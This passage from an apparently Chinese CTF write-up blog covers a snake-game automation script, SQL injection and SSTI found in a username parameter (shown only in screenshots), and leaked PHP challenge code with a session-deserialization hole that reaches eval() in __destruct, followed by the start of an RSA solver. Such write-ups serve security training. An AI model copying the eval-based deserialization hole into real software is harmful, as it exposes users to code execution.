class="attr">&quot;flag&quot;</span><span class="punctuation">:</span><span class="string">&quot;ZmxhZ3tkM2MxNzZjZC05ZjhiLTRlOWQtOWM3Yi1mYzgyZTUxYzUwOTd9&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><h2 id="snake"><a class="markdownIt-Anchor" href="#snake">#</a> snake：</h2><p>​打游戏，写个脚本去跑，先审 js，发现了一些信息，比如 move 路由什么的，直接拿去写脚本，网上找了一圈，找到一些算法， 都改一改拿去试，最后这个能跑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始方向</span></span><br><span class="line">current_direction = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze4zqdxex49cesyexgc.cloudeci1.ichunqiu.com:5000/move&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送方向请求并获取游戏状态</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_direction_and_get_state</span>(<span class="params">direction</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJ1c2VybmFtZSI6ImcwMWRlbiJ9.ZycoKQ.BlD0y752_1q7iLu3ZVk5tsO6fKo&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = json.dumps(&#123;<span class="string">&quot;direction&quot;</span>: direction&#125;)</span><br><span class="line">    response = requests.post(url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">f&quot;Failed to send direction: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response:&quot;</span>, response.json())</span><br><span class="line">    <span class="keyword">return</span> response.json()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算曼哈顿距离</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heuristic</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(a[<span class="number">0</span>] - b[<span class="number">0</span>]) + <span class="built_in">abs</span>(a[<span class="number">1</span>] - b[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># A* 寻路算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a_star_search</span>(<span class="params">start, goal, snake</span>):</span><br><span class="line">    open_set = []</span><br><span class="line">    heapq.heappush(open_set, (<span class="number">0</span>, start))</span><br><span class="line">    came_from = &#123;&#125;</span><br><span class="line">    g_score = &#123;<span class="built_in">tuple</span>(start): <span class="number">0</span>&#125;</span><br><span class="line">    f_score = &#123;<span class="built_in">tuple</span>(start): heuristic(start, goal)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> open_set:</span><br><span class="line">        _, current = heapq.heappop(open_set)</span><br><span class="line">        current = <span class="built_in">tuple</span>(current)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current == <span class="built_in">tuple</span>(goal):</span><br><span class="line">            path = []</span><br><span class="line">            <span class="keyword">while</span> current <span class="keyword">in</span> came_from:</span><br><span class="line">                path.append(current)</span><br><span class="line">                current = came_from[current]</span><br><span class="line">            path.reverse()</span><br><span class="line">            <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">        neighbors = [</span><br><span class="line">            (current[<span class="number">0</span>] + <span class="number">1</span>, current[<span class="number">1</span>]),  <span class="comment"># RIGHT</span></span><br><span class="line">            (current[<span class="number">0</span>] - <span class="number">1</span>, current[<span class="number">1</span>]),  <span class="comment"># LEFT</span></span><br><span class="line">            (current[<span class="number">0</span>], current[<span class="number">1</span>] + <span class="number">1</span>),  <span class="comment"># DOWN</span></span><br><span class="line">            (current[<span class="number">0</span>], current[<span class="number">1</span>] - <span class="number">1</span>)   <span class="comment"># UP</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> neighbor <span class="keyword">in</span> neighbors:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= neighbor[<span class="number">0</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= neighbor[<span class="number">1</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="built_in">list</span>(neighbor) <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">                tentative_g_score = g_score[<span class="built_in">tuple</span>(current)] + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">tuple</span>(neighbor) <span class="keyword">not</span> <span class="keyword">in</span> g_score <span class="keyword">or</span> tentative_g_score &lt; g_score[<span class="built_in">tuple</span>(neighbor)]:</span><br><span class="line">                    came_from[<span class="built_in">tuple</span>(neighbor)] = current</span><br><span class="line">                    g_score[<span class="built_in">tuple</span>(neighbor)] = tentative_g_score</span><br><span class="line">                    f_score[<span class="built_in">tuple</span>(neighbor)] = tentative_g_score + heuristic(neighbor, goal)</span><br><span class="line">                    heapq.heappush(open_set, (f_score[<span class="built_in">tuple</span>(neighbor)], neighbor))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算下一步的方向</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_next_direction</span>(<span class="params">snake, food, current_direction</span>):</span><br><span class="line">    head = snake[<span class="number">0</span>]</span><br><span class="line">    path = a_star_search(head, food, snake)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> path:</span><br><span class="line">        next_head = path[<span class="number">0</span>]</span><br><span class="line">        x_diff = next_head[<span class="number">0</span>] - head[<span class="number">0</span>]</span><br><span class="line">        y_diff = next_head[<span class="number">1</span>] - head[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> x_diff == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> x_diff == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;LEFT&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> y_diff == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;DOWN&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> y_diff == -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;UP&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果找不到路径，随机选择一个安全的方向</span></span><br><span class="line">    possible_directions = [<span class="string">&#x27;UP&#x27;</span>, <span class="string">&#x27;DOWN&#x27;</span>, <span class="string">&#x27;LEFT&#x27;</span>, <span class="string">&#x27;RIGHT&#x27;</span>]</span><br><span class="line">    opposite_directions = &#123;<span class="string">&#x27;UP&#x27;</span>: <span class="string">&#x27;DOWN&#x27;</span>, <span class="string">&#x27;DOWN&#x27;</span>: <span class="string">&#x27;UP&#x27;</span>, <span class="string">&#x27;LEFT&#x27;</span>: <span class="string">&#x27;RIGHT&#x27;</span>, <span class="string">&#x27;RIGHT&#x27;</span>: <span class="string">&#x27;LEFT&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> direction <span class="keyword">in</span> possible_directions:</span><br><span class="line">        <span class="keyword">if</span> direction == opposite_directions[current_direction]:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 不选择相反方向</span></span><br><span class="line"></span><br><span class="line">        next_head = &#123;</span><br><span class="line">            <span class="string">&#x27;UP&#x27;</span>: [head[<span class="number">0</span>], head[<span class="number">1</span>] - <span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;DOWN&#x27;</span>: [head[<span class="number">0</span>], head[<span class="number">1</span>] + <span class="number">1</span>],</span><br><span class="line">            <span class="string">&#x27;LEFT&#x27;</span>: [head[<span class="number">0</span>] - <span class="number">1</span>, head[<span class="number">1</span>]],</span><br><span class="line">            <span class="string">&#x27;RIGHT&#x27;</span>: [head[<span class="number">0</span>] + <span class="number">1</span>, head[<span class="number">1</span>]]</span><br><span class="line">        &#125;[direction]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt;= next_head[<span class="number">0</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= next_head[<span class="number">1</span>] &lt; <span class="number">20</span> <span class="keyword">and</span> next_head <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">            <span class="keyword">return</span> direction</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果所有方向都会导致碰撞，返回当前方向</span></span><br><span class="line">    <span class="keyword">return</span> current_direction</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主循环</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_loop</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化游戏状态</span></span><br><span class="line">        game_state = send_direction_and_get_state(<span class="string">&#x27;RIGHT&#x27;</span>)</span><br><span class="line">        snake = game_state[<span class="string">&#x27;snake&#x27;</span>]</span><br><span class="line">        food = game_state[<span class="string">&#x27;food&#x27;</span>]</span><br><span class="line">        score = game_state[<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">        current_direction = <span class="string">&#x27;RIGHT&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 计算下一步的方向</span></span><br><span class="line">            next_direction = calculate_next_direction(snake, food, current_direction)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送方向请求并获取新的游戏状态</span></span><br><span class="line">            game_state = send_direction_and_get_state(next_direction)</span><br><span class="line">            snake = game_state[<span class="string">&#x27;snake&#x27;</span>]</span><br><span class="line">            food = game_state[<span class="string">&#x27;food&#x27;</span>]</span><br><span class="line">            new_score = game_state[<span class="string">&#x27;score&#x27;</span>]</span><br><span class="line">            status = game_state[<span class="string">&#x27;status&#x27;</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 更新方向</span></span><br><span class="line">            current_direction = next_direction</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 打印当前状态</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Current direction: <span class="subst">&#123;next_direction&#125;</span>, Snake: <span class="subst">&#123;snake&#125;</span>, Food: <span class="subst">&#123;food&#125;</span>, Score: <span class="subst">&#123;new_score&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> status != <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Game over with status: <span class="subst">&#123;status&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序已退出&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main_loop()</span><br></pre></td></tr></table></figure><p>​最后得到了这个：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response<span class="punctuation">:</span> <span class="punctuation">&#123;</span>&#x27;status&#x27;<span class="punctuation">:</span> &#x27;win&#x27;<span class="punctuation">,</span> &#x27;url&#x27;<span class="punctuation">:</span> &#x27;/snake_win?username=g01den&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​之后访问这个路由，感觉怪怪的，没有 flag，发现 username 的参数直接被打印了，测一测 ssti，失败了，完蛋。或者说，试试看 sql 注入，能成功，最后找到了列数：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5084599173804427bdc3b1a2353bcb7a.png#pic_center" alt="在这里插入图片描述"></p><p>​能出，不过，我不理解为啥这里也能出 ssti？请看 VCR：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/32ea45b9656242ed8fde7ea072d05877.png#pic_center" alt="在这里插入图片描述"></p><p>​这个源码层面咋实现的？有点刁钻了，算了，直接嗦（这里被当作 html 执行了，所以看不到）：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/6f915faccad24280a7fc245b46464a92.png#pic_center" alt="在这里插入图片描述"></p><p><img data-src="https://i-blog.csdnimg.cn/direct/80af9bc9b43b4694941b70507ec7d561.png#pic_center" alt="在这里插入图片描述"></p><p>​得到 flag。</p><h2 id="platform复现"><a class="markdownIt-Anchor" href="#platform复现">#</a> platform（复现）：</h2><p>​www.zip 泄露，index：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;user.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sessionManager</span> = <span class="keyword">new</span> <span class="title class_">SessionManager</span>();</span><br><span class="line"><span class="variable">$SessionRandom</span> = <span class="keyword">new</span> <span class="title class_">SessionRandom</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;session_key&#x27;</span>] =<span class="variable">$SessionRandom</span> -&gt; <span class="title function_ invoke__">generateRandomString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="variable">$password</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$sessionManager</span>-&gt;<span class="title function_ invoke__">filterSensitiveFunctions</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;login.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​存在 <code>session_start();</code> ，估摸着有 session 反序列化，先记录下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SessionRandom</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$charactersLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>);</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="variable">$charactersLength</span> - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​ <code>['session_key']</code>  长度是 1 到 50 随机的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterSensitiveFunctions</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sessionFile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionFilePath</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sessionFile</span>)) &#123;</span><br><span class="line">            <span class="variable">$sessionData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$sessionFile</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sessionFile</span>, <span class="variable">$sessionData</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Session file not found.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​这里也有点儿重要，有读取 -&gt; 替换 -&gt; 写入，并且是操作 session 的文件，感觉是字符逃逸，变少的那种。</p><p>​这里存在 eval 函数，需要直接对其进行反序列化，然后触发 <code>__destruct</code> .</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​现在就是看看触发反序列化的方法。大佬们说，可以通过追加写入，大佬用的是 password 数组去逃逸的，这里具体原理不是很懂，反正有附件，先记录下，之后捣鼓:</p><p><img data-src="https://i-blog.csdnimg.cn/direct/ae98b430553b49d78d78b3f4e9681058.png#pic_center" alt="在这里插入图片描述"></p><p><img data-src="https://i-blog.csdnimg.cn/direct/7899de5fe03643afbcc30815a260aeaf.png#pic_center" alt="在这里插入图片描述"></p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto">#</a> Crypto：</h1><h2 id="eazyrsa"><a class="markdownIt-Anchor" href="#eazyrsa">#</a> eazyrsa：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"># encoding:utf-8</span><br><span class="line">from Crypto.Util.number import bytes_to_long, long_to_bytes</span><br><span class="line">from gmpy2 import mpz, iroot, powmod, invert, is_prime</span><br><span class="line">import sys</span><br><span class="line">import multiprocessing as mp</span><br><span class="line"></span><br><span class="line"># 定义常量</span><br><span class="line">N = mpz(</span><br><span class="line">    &#x27;67962725468240199924103144864951334845750492508509360358636648068909779932072313362607631417524914992411826230276465100489023746209605790020210412575433464887238013738989770872867041592441153421617243161413094177629581581728221687772551567927241071007480087793370382177952900925657974338348428988433092737432689512506966089398873760401212521089061934975582692308605433023613521500237258699626587149952370997420510392932840377408736864097301789914658244266522930092113493152991783027162871212338968297436073316959569822974289536559300512091342692975133379473145882007983357289924135373382264527866381118893476257705939&#x27;)</span><br><span class="line"># g是一个500位数，且g整除p-1和q-1</span><br><span class="line">g = mpz(</span><br><span class="line">    &#x27;3235645591686044532495326878291617484542045511433360748778013933565021819649890342389737893735574764418484922895778834144345295691799766302763199373647&#x27;)</span><br><span class="line">e = 65537</span><br><span class="line">C = mpz(</span><br><span class="line">    &#x27;7918937034819399210460701361082120267249016865135589044938397478179178418982216265766430882604707450651405790878761026681351233717846491757101684210544361607883043938000941498442897699091016071609425252346011280078699567193949155766516051130050592046343488075564740812480634431357869210712013396437065989799117830247228129120071415956115563715118301273810713118159274551107354918579047901176471910532333125717712607469726900731370186233984133546278420585661042017307325998441634272568791745798269084955686428143476025911093137683806174746625559312685862694783475952178855060639359433340135424849663386199035593137765&#x27;)</span><br><span class="line"></span><br><span class="line"># 计算辅助变量，使用整数除法 //</span><br><span class="line">h = (N - 1) // 